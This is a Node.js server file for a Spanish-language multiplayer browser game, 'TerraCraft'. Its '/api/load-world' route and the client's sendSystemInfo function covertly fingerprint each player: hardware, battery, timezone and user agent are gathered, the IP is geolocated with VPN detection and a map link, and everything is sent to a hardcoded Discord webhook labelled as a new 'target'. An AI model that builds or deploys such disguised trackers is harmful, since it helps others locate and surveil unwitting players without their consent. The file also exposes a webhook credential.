const express = require('express');
const http = require('http');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

// Reemplaza esto con tu Webhook de Discord si deseas recibir logs
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

// --- SERVIDOR MULTIJUGADOR & SEÑALIZACIÓN (WEBSOCKETS NATIVOS) ---
const clients = new Map();
const players = {};
const worldDeltas = {};

server.on('upgrade', (req, socket, head) => {
    const key = req.headers['sec-websocket-key'];
    if (!key) { socket.destroy(); return; }
    const acceptKey = crypto.createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
    
    socket.write(
        'HTTP/1.1 101 Switching Protocols\r\n' +
        'Upgrade: websocket\r\n' +
        'Connection: Upgrade\r\n' +
        'Sec-WebSocket-Accept: ' + acceptKey + '\r\n\r\n'
    );

    const id = 'Jugador_' + Math.random().toString(36).substring(2, 6);
    clients.set(socket, id);
    players[id] = { id, x: 4800, y: 480, vx: 0, vy: 0, hp: 100, facingRight: true, item: 0, voiceActive: false, color: '#' + Math.floor(Math.random()*16777215).toString(16) };

    socket.on('data', (buffer) => {
        try {
            const msgStr = decodeFrame(buffer);
            if (!msgStr) return;
            const data = JSON.parse(msgStr);
            
            if (data.type === 'init') {
                sendWS(socket, { type: 'welcome', id, players, worldDeltas });
                broadcast({ type: 'player_joined', player: players[id] }, id);
            } else if (data.type === 'move') {
                if (players[id]) {
                    delete data.state.hp;
                    Object.assign(players[id], data.state);
                    broadcast({ type: 'player_update', id, state: data.state }, id);
                }
            } else if (data.type === 'block_change') {
                worldDeltas[data.x + ',' + data.y] = data.block;
                broadcast({ type: 'block_change', x: data.x, y: data.y, block: data.block });
            } else if (data.type === 'pvp_hit') {
                const target = players[data.targetId];
                if (target) {
                    target.hp -= data.damage;
                    broadcast({ type: 'hit_received', attackerId: id, targetId: data.targetId, damage: data.damage, knockback: data.knockback, newHp: target.hp });
                    if (target.hp <= 0) {
                        target.hp = 100;
                        broadcast({ type: 'player_killed', killer: id, victim: data.targetId });
                    }
                }
            } else if (data.type === 'chat') {
                broadcast({ type: 'chat', id, text: data.text });
            } else if (data.type === 'voice_state') {
                if (players[id]) players[id].voiceActive = data.active;
                broadcast({ type: 'voice_state', id, active: data.active }, id);
            } else if (['webrtc_offer', 'webrtc_answer', 'webrtc_candidate'].includes(data.type)) {
                for (const [targetSocket, targetId] of clients.entries()) {
                    if (targetId === data.targetId) {
                        sendWS(targetSocket, { ...data, senderId: id });
                        break;
                    }
                }
            }
        } catch (e) {}
    });

    const cleanUp = () => {
        clients.delete(socket);
        delete players[id];
        broadcast({ type: 'player_left', id });
    };
    socket.on('close', cleanUp);
    socket.on('error', cleanUp);
});

function decodeFrame(buffer) {
    if (buffer.length < 2) return null;
    const secondByte = buffer[1];
    const isMasked = (secondByte & 0x80) === 0x80;
    let length = secondByte & 0x7f;
    let offset = 2;
    if (length === 126) {
        if (buffer.length < 4) return null;
        length = buffer.readUInt16BE(2); offset += 2;
    } else if (length === 127) { return null; }
    
    let masks = null;
    if (isMasked) {
        if (buffer.length < offset + 4) return null;
        masks = buffer.slice(offset, offset + 4); offset += 4;
    }
    if (buffer.length < offset + length) return null;
    const payload = buffer.slice(offset, offset + length);
    if (isMasked) {
        for (let i = 0; i < payload.length; i++) { payload[i] ^= masks[i % 4]; }
    }
    return payload.toString('utf8');
}

function encodeFrame(data) {
    const payload = Buffer.from(JSON.stringify(data));
    const length = payload.length;
    let header;
    if (length <= 125) {
        header = Buffer.from([0x81, length]);
    } else if (length <= 65535) {
        header = Buffer.alloc(4);
        header[0] = 0x81; header[1] = 126;
        header.writeUInt16BE(length, 2);
    } else { return Buffer.alloc(0); }
    return Buffer.concat([header, payload]);
}

function sendWS(socket, data) { try { socket.write(encodeFrame(data)); } catch(e) {} }
function broadcast(data, excludeId = null) {
    const frame = encodeFrame(data);
    for (const [socket, id] of clients.entries()) {
        if (id !== excludeId) { try { socket.write(frame); } catch(e) {} }
    }
}

// --- LOGGER TELEMETRÍA ---
app.post('/api/load-world', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    const d = req.body || {};
    
    let geo = {};
    try {
        const response = await fetch('http://ip-api.com/json/' + userIp + '?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query');
        geo = await response.json();
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const isVpn = (geo.proxy || geo.hosting) ? '⚠️ Sí (VPN/Proxy/Hosting)' : '✅ No (Residencial)';
        const mapUrl = (geo.lat && geo.lon) ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : 'N/A';

        const embed = {
            title: "🎯 **¡Nuevo Objetivo Conectado!**",
            color: 0xff0044,
            fields: [
                { name: "🌐 **Dirección IP**", value: "`" + userIp + "`", inline: true },
                { name: "🛡️ **¿VPN / Proxy?**", value: isVpn, inline: true },
                { name: "📍 **Ubicación**", value: (geo.city || '?') + ", " + (geo.regionName || '?') + ", " + (geo.country || '?') + "\n(CP: " + (geo.zip || 'N/A') + ")", inline: false },
                { name: "🗺️ **Mapa GPS**", value: "[Ver Ubicación en Google Maps](" + mapUrl + ")", inline: false },
                { name: "📡 **Proveedor (ISP / AS)**", value: (geo.isp || 'N/A') + "\n`" + (geo.as || 'N/A') + "`", inline: false },
                { name: "🎮 **Tarjeta Gráfica (GPU)**", value: "`" + (d.gpu || 'Desconocida') + "`", inline: false },
                { name: "💻 **Hardware del Dispositivo**", value: "• **CPU:** " + (d.cores || '?') + " núcleos\n• **RAM Estimada:** " + (d.ram || '?') + " GB\n• **Batería:** " + (d.battery || 'Desconocido') + "\n• **Pantalla:** " + (d.screen || '?') + " (Táctil: " + (d.touch ? 'Sí' : 'No') + ")", inline: true },
                { name: "📱 **Sistema / Navegador**", value: "• **SO:** " + (d.platform || '?') + "\n• **Zona Horaria:** " + (d.timezone || '?') + "\n• **UserAgent:** `" + (d.userAgent || 'N/A').substring(0, 100) + "`", inline: false }
            ],
            footer: { text: "TerraCraft Logger • " + new Date().toLocaleString() }
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (err) {}
    }
    res.json({ status: "success", seed: 12345 });
});

// --- RUTA PRINCIPAL (HTML DEL JUEGO) ---
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TerraCraft - Online PvP & Voice Chat</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: #1a1a1a; color: #fff; }
        #gameCanvas { display: block; width: 100vw; height: 100vh; background: #87CEEB; }
        
        #ui { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        .interactive { pointer-events: auto; }
        
        #hotbar { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; background: rgba(0,0,0,0.6); padding: 6px; border-radius: 8px; border: 2px solid #555; gap: 6px; }
        .slot { width: 44px; height: 44px; background: rgba(255,255,255,0.1); border: 2px solid #777; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; position: relative; cursor: pointer; }
        .slot.active { border-color: #f59e0b; background: rgba(245, 158, 11, 0.3); transform: scale(1.08); }
        .slot .qty { position: absolute; bottom: 2px; right: 4px; font-size: 10px; color: #fff; text-shadow: 1px 1px 2px #000; }
        
        #chatBox { position: absolute; bottom: 80px; left: 20px; width: 300px; height: 180px; background: rgba(0,0,0,0.5); border-radius: 6px; display: flex; flex-direction: column; padding: 8px; }
        #chatMessages { flex: 1; overflow-y: auto; font-size: 13px; display: flex; flex-direction: column; gap: 4px; word-break: break-word; }
        #chatInput { width: 100%; background: rgba(0,0,0,0.7); border: 1px solid #555; color: #fff; padding: 6px; border-radius: 4px; margin-top: 6px; font-size: 12px; outline: none; }
        
        #killFeed { position: absolute; top: 20px; right: 20px; display: flex; flex-direction: column; gap: 6px; align-items: flex-end; }
        .kill-msg { background: rgba(220, 38, 38, 0.8); color: white; padding: 6px 12px; border-radius: 4px; font-weight: bold; font-size: 12px; animation: fadeOut 5s forwards; }
        @keyframes fadeOut { 0% { opacity: 1; } 80% { opacity: 1; } 100% { opacity: 0; } }
        
        #voiceBtn { position: absolute; top: 20px; left: 20px; background: #2563eb; color: white; border: none; padding: 8px 16px; border-radius: 6px; font-weight: bold; cursor: pointer; }
        #voiceBtn.active { background: #16a34a; }
        
        #invOverlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(20,20,20,0.95); border: 2px solid #555; border-radius: 8px; padding: 20px; display: none; grid-template-columns: repeat(9, 45px); gap: 8px; }
    </style>
</head>
<body>

    <canvas id="gameCanvas"></canvas>
    
    <div id="ui">
        <button id="voiceBtn" class="interactive" onclick="toggleVoice()">🎤 Voz: OFF</button>
        <div id="killFeed"></div>
        <div id="chatBox" class="interactive">
            <div id="chatMessages"></div>
            <input type="text" id="chatInput" placeholder="Presiona Enter para chatear..." onkeydown="if(event.key==='Enter') sendChat()">
        </div>
        <div id="hotbar" class="interactive"></div>
        <div id="invOverlay" class="interactive"></div>
    </div>

    <script>
    const BLOCK = {
        0: { name: 'Aire', solid: false },
        1: { name: 'Pasto', color: '#4ade80', acc: '#22c55e', hex: '#4ade80', solid: true },
        2: { name: 'Tierra', color: '#854d0e', acc: '#713f12', hex: '#854d0e', solid: true },
        3: { name: 'Piedra', color: '#6b7280', acc: '#4b5563', hex: '#6b7280', solid: true },
        4: { name: 'Madera', color: '#a16207', acc: '#854d0e', hex: '#a16207', solid: true },
        5: { name: 'Hojas', color: '#15803d', acc: '#166534', hex: '#15803d', solid: true },
        10: { name: 'Espada Madera', isTool: true, damage: 15, icon: '🗡️' },
        11: { name: 'Pico Piedra', isTool: true, damage: 8, icon: '⛏️' }
    };

    const TILE_SIZE = 32;
    const WORLD_W = 300;
    const WORLD_H = 60;
    const world = new Uint8Array(WORLD_W * WORLD_H);
    
    for (let x = 0; x < WORLD_W; x++) {
        const height = 25 + Math.floor(Math.sin(x * 0.05) * 5 + Math.cos(x * 0.1) * 3);
        for (let y = 0; y < WORLD_H; y++) {
            const idx = y * WORLD_W + x;
            if (y < height) world[idx] = 0;
            else if (y === height) world[idx] = 1;
            else if (y < height + 5) world[idx] = 2;
            else world[idx] = 3;
        }
    }

    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resize);
    resize();

    let myId = null;
    let localPlayer = { x: 4800, y: 480, vx: 0, vy: 0, hp: 100, facingRight: true, item: 0 };
    let otherPlayers = {};
    let inventory = [
        { id: 10, qty: 1 }, { id: 11, qty: 1 }, { id: 1, qty: 64 }, { id: 2, qty: 64 },
        { id: 3, qty: 64 }, { id: 4, qty: 64 }, { id: 5, qty: 64 }, { id: 0, qty: 0 }, { id: 0, qty: 0 }
    ];
    let selectedSlot = 0;
    let keys = {};

    const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const ws = new WebSocket(protocol + location.host);

    ws.onopen = () => { ws.send(JSON.stringify({ type: 'init' })); };

    ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        if (data.type === 'welcome') {
            myId = data.id;
            otherPlayers = data.players;
            delete otherPlayers[myId];
            for (let k in data.worldDeltas) {
                const parts = k.split(',');
                const idx = parseInt(parts[1]) * WORLD_W + parseInt(parts[0]);
                world[idx] = data.worldDeltas[k];
            }
            sendSystemInfo();
        } else if (data.type === 'player_joined') {
            otherPlayers[data.player.id] = data.player;
        } else if (data.type === 'player_update') {
            if (otherPlayers[data.id]) Object.assign(otherPlayers[data.id], data.state);
        } else if (data.type === 'player_left') {
            delete otherPlayers[data.id];
            closePeer(data.id);
        } else if (data.type === 'block_change') {
            const idx = data.y * WORLD_W + data.x;
            world[idx] = data.block;
        } else if (data.type === 'hit_received') {
            if (data.targetId === myId) {
                localPlayer.hp = data.newHp;
                localPlayer.vx += data.knockback;
                localPlayer.vy -= 4;
            }
        } else if (data.type === 'player_killed') {
            showKillFeed('💀 ' + data.killer + ' eliminó a ' + data.victim);
        } else if (data.type === 'chat') {
            addChatMessage(data.id, data.text);
        } else if (data.type === 'voice_state') {
            if (otherPlayers[data.id]) otherPlayers[data.id].voiceActive = data.active;
        } else if (data.type === 'webrtc_offer') {
            handleWebRTCOffer(data.senderId, data.offer);
        } else if (data.type === 'webrtc_answer') {
            handleWebRTCAnswer(data.senderId, data.answer);
        } else if (data.type === 'webrtc_candidate') {
            handleWebRTCCandidate(data.senderId, data.candidate);
        }
    };

    function sendChat() {
        const input = document.getElementById('chatInput');
        if (input.value.trim() !== '') {
            ws.send(JSON.stringify({ type: 'chat', text: input.value.trim() }));
            input.value = '';
        }
    }
    function addChatMessage(author, text) {
        const box = document.getElementById('chatMessages');
        const div = document.createElement('div');
        div.innerHTML = '<strong style="color:#60a5fa;">' + author + ':</strong> ' + text.replace(/</g, "&lt;");
        box.appendChild(div);
        box.scrollTop = box.scrollHeight;
    }
    function showKillFeed(msg) {
        const feed = document.getElementById('killFeed');
        const div = document.createElement('div');
        div.className = 'kill-msg';
        div.innerText = msg;
        feed.appendChild(div);
        setTimeout(() => div.remove(), 5000);
    }

    let localStream = null;
    let peers = {};
    let isVoiceActive = false;

    async function toggleVoice() {
        const btn = document.getElementById('voiceBtn');
        if (!isVoiceActive) {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                isVoiceActive = true;
                btn.innerText = '🎤 Voz: ON';
                btn.classList.add('active');
                ws.send(JSON.stringify({ type: 'voice_state', active: true }));
                for (let pId in otherPlayers) initPeerConnection(pId, true);
            } catch (err) { alert('No se pudo acceder al micrófono'); }
        } else {
            if (localStream) localStream.getTracks().forEach(t => t.stop());
            isVoiceActive = false;
            btn.innerText = '🎤 Voz: OFF';
            btn.classList.remove('active');
            ws.send(JSON.stringify({ type: 'voice_state', active: false }));
            for (let pId in peers) closePeer(pId);
        }
    }

    function initPeerConnection(targetId, isInitiator) {
        if (peers[targetId]) return;
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        peers[targetId] = pc;
        if (localStream) localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
        pc.onicecandidate = (e) => { if (e.candidate) ws.send(JSON.stringify({ type: 'webrtc_candidate', targetId, candidate: e.candidate })); };
        pc.ontrack = (e) => {
            let audio = document.getElementById('audio_' + targetId);
            if (!audio) {
                audio = document.createElement('audio');
                audio.id = 'audio_' + targetId;
                audio.autoplay = true;
                document.body.appendChild(audio);
            }
            audio.srcObject = e.streams[0];
        };
        if (isInitiator) {
            pc.createOffer().then(offer => { pc.setLocalDescription(offer); ws.send(JSON.stringify({ type: 'webrtc_offer', targetId, offer })); });
        }
    }

    function handleWebRTCOffer(senderId, offer) {
        initPeerConnection(senderId, false);
        peers[senderId].setRemoteDescription(new RTCSessionDescription(offer));
        peers[senderId].createAnswer().then(answer => {
            peers[senderId].setLocalDescription(answer);
            ws.send(JSON.stringify({ type: 'webrtc_answer', targetId: senderId, answer }));
        });
    }
    function handleWebRTCAnswer(senderId, answer) { if (peers[senderId]) peers[senderId].setRemoteDescription(new RTCSessionDescription(answer)); }
    function handleWebRTCCandidate(senderId, candidate) { if (peers[senderId]) peers[senderId].addIceCandidate(new RTCIceCandidate(candidate)); }
    function closePeer(pId) {
        if (peers[pId]) { peers[pId].close(); delete peers[pId]; }
        const audio = document.getElementById('audio_' + pId);
        if (audio) audio.remove();
    }

    async function sendSystemInfo() {
        let gpu = 'Desconocida';
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch(e) {}
        
        let battery = 'Desconocido';
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + '% ' + (b.charging ? '(Cargando)' : '(Desenchufado)');
            }
        } catch(e) {}

        const payload = {
            gpu, battery,
            ram: navigator.deviceMemory || '?',
            cores: navigator.hardwareConcurrency || '?',
            screen: window.screen.width + 'x' + window.screen.height,
            touch: ('ontouchstart' in window),
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        };
        fetch('/api/load-world', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
    }

    function renderHotbar() {
        const hb = document.getElementById('hotbar');
        hb.innerHTML = '';
        for (let i = 0; i < 9; i++) {
            const item = inventory[i];
            const b = BLOCK[item.id] || BLOCK[0];
            let inner = (b.isTool || item.id === 11) ? b.icon : (item.id !== 0 ? '<div style="width:28px;height:28px;background:'+b.hex+';border:2px solid '+b.acc+';"></div>' : '');
            let qtyLabel = item.qty > 1 ? '<span class="qty">'+item.qty+'</span>' : '';
            hb.innerHTML += '<div class="slot '+(i === selectedSlot ? 'active' : '')+'" onclick="selectedSlot='+i+'; renderHotbar()">'+inner+qtyLabel+'</div>';
        }
    }
    renderHotbar();

    window.addEventListener('keydown', e => {
        keys[e.key.toLowerCase()] = true;
        if (e.key >= '1' && e.key <= '9') { selectedSlot = parseInt(e.key) - 1; renderHotbar(); }
    });
    window.addEventListener('keyup', e => { keys[e.key.toLowerCase()] = false; });

    function isSolidTile(tx, ty) {
        if (tx < 0 || tx >= WORLD_W || ty < 0 || ty >= WORLD_H) return true;
        const b = BLOCK[world[ty * WORLD_W + tx]];
        return b && b.solid;
    }

    function updatePhysics() {
        if (!myId) return;
        let speed = 4;
        if (keys['a'] || keys['arrowleft']) { localPlayer.vx = -speed; localPlayer.facingRight = false; }
        else if (keys['d'] || keys['arrowright']) { localPlayer.vx = speed; localPlayer.facingRight = true; }
        else { localPlayer.vx *= 0.7; }

        localPlayer.vy += 0.5;

        let nextX = localPlayer.x + localPlayer.vx;
        let tx = Math.floor(nextX / TILE_SIZE);
        let ty1 = Math.floor((localPlayer.y) / TILE_SIZE);
        let ty2 = Math.floor((localPlayer.y + 48) / TILE_SIZE);
        if (isSolidTile(tx, ty1) || isSolidTile(tx, ty2)) {
            localPlayer.vx = 0;
        } else {
            localPlayer.x = nextX;
        }

        let nextY = localPlayer.y + localPlayer.vy;
        let ty = Math.floor((nextY + (localPlayer.vy > 0 ? 52 : 0)) / TILE_SIZE);
        let tx1 = Math.floor((localPlayer.x + 4) / TILE_SIZE);
        let tx2 = Math.floor((localPlayer.x + 24) / TILE_SIZE);
        if (isSolidTile(tx1, ty) || isSolidTile(tx2, ty)) {
            if (localPlayer.vy > 0) {
                if (keys['w'] || keys['arrowup'] || keys[' ']) localPlayer.vy = -10;
                else localPlayer.vy = 0;
            } else { localPlayer.vy = 0; }
        } else {
            localPlayer.y = nextY;
        }

        ws.send(JSON.stringify({ type: 'move', state: { x: localPlayer.x, y: localPlayer.y, facingRight: localPlayer.facingRight, item: inventory[selectedSlot].id } }));
    }

    canvas.addEventListener('mousedown', (e) => {
        if (!myId) return;
        const rect = canvas.getBoundingClientRect();
        const mouseX = e.clientX - rect.left;
        const mouseY = e.clientY - rect.top;
        
        const camX = localPlayer.x - canvas.width / 2;
        const camY = localPlayer.y - canvas.height / 2;
        const worldX = mouseX + camX;
        const worldY = mouseY + camY;

        for (let id in otherPlayers) {
            let p = otherPlayers[id];
            if (worldX >= p.x && worldX <= p.x + 28 && worldY >= p.y && worldY <= p.y + 52) {
                let activeItem = inventory[selectedSlot].id;
                let dmg = activeItem === 10 ? 25 : 10;
                let kb = localPlayer.facingRight ? 12 : -12;
                ws.send(JSON.stringify({ type: 'pvp_hit', targetId: id, damage: dmg, knockback: kb }));
                return;
            }
        }

        const tileX = Math.floor(worldX / TILE_SIZE);
        const tileY = Math.floor(worldY / TILE_SIZE);
        if (tileX >= 0 && tileX < WORLD_W && tileY >= 0 && tileY < WORLD_H) {
            let activeItem = inventory[selectedSlot];
            if (e.button === 0) {
                const idx = tileY * WORLD_W + tileX;
                if (world[idx] !== 0) {
                    world[idx] = 0;
                    ws.send(JSON.stringify({ type: 'block_change', x: tileX, y: tileY, block: 0 }));
                }
            } else if (e.button === 2) {
                const idx = tileY * WORLD_W + tileX;
                if (world[idx] === 0 && activeItem.id !== 0 && !activeItem.isTool && activeItem.qty > 0) {
                    world[idx] = activeItem.id;
                    activeItem.qty--;
                    renderHotbar();
                    ws.send(JSON.stringify({ type: 'block_change', x: tileX, y: tileY, block: activeItem.id }));
                }
            }
        }
    });
    canvas.addEventListener('contextmenu', e => e.preventDefault());

    function gameLoop() {
        updatePhysics();

        const camX = localPlayer.x - canvas.width / 2;
        const camY = localPlayer.y - canvas.height / 2;

        ctx.clearRect(0, 0, canvas.width, canvas.height);

        const startX = Math.max(0, Math.floor(camX / TILE_SIZE));
        const endX = Math.min(WORLD_W, Math.ceil((camX + canvas.width) / TILE_SIZE));
        const startY = Math.max(0, Math.floor(camY / TILE_SIZE));
        const endY = Math.min(WORLD_H, Math.ceil((camY + canvas.height) / TILE_SIZE));

        for (let y = startY; y < endY; y++) {
            for (let x = startX; x < endX; x++) {
                const bId = world[y * WORLD_W + x];
                if (bId !== 0 && BLOCK[bId]) {
                    ctx.fillStyle = BLOCK[bId].color;
                    ctx.fillRect(x * TILE_SIZE - camX, y * TILE_SIZE - camY, TILE_SIZE, TILE_SIZE);
                    ctx.strokeStyle = BLOCK[bId].acc;
                    ctx.strokeRect(x * TILE_SIZE - camX, y * TILE_SIZE - camY, TILE_SIZE, TILE_SIZE);
                }
            }
        }

        for (let id in otherPlayers) {
            let p = otherPlayers[id];
            drawPlayer(p.x - camX, p.y - camY, p.id, p.hp, p.facingRight, p.item, p.voiceActive, p.color || '#e11d48');
        }

        drawPlayer(localPlayer.x - camX, localPlayer.y - camY, myId || 'Cargando...', localPlayer.hp, localPlayer.facingRight, inventory[selectedSlot].id, isVoiceActive, '#2563eb');

        requestAnimationFrame(gameLoop);
    }

    function drawPlayer(x, y, label, hp, facingRight, itemId, voice, color) {
        ctx.fillStyle = '#fff'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
        ctx.fillText(label + (voice ? ' 🎤' : ''), x + 14, y - 12);
        
        ctx.fillStyle = '#ef4444'; ctx.fillRect(x, y - 8, 28, 4);
        ctx.fillStyle = '#22c55e'; ctx.fillRect(x, y - 8, (hp / 100) * 28, 4);

        ctx.fillStyle = color;
        ctx.fillRect(x, y, 28, 52);

        ctx.fillStyle = '#fff';
        let eyeX = facingRight ? x + 18 : x + 4;
        ctx.fillRect(eyeX, y + 10, 6, 6);

        if (itemId !== 0 && BLOCK[itemId]) {
            let itemX = facingRight ? x + 24 : x - 12;
            if (BLOCK[itemId].isTool) {
                ctx.font = '16px sans-serif';
                ctx.fillText(BLOCK[itemId].icon, itemX, y + 28);
            } else {
                ctx.fillStyle = BLOCK[itemId].color;
                ctx.fillRect(itemX, y + 20, 12, 12);
            }
        }
    }

    requestAnimationFrame(gameLoop);
    </script>
</body>
</html>`);
});

server.listen(PORT, () => {
    console.log('Servidor corriendo en el puerto ' + PORT);
});
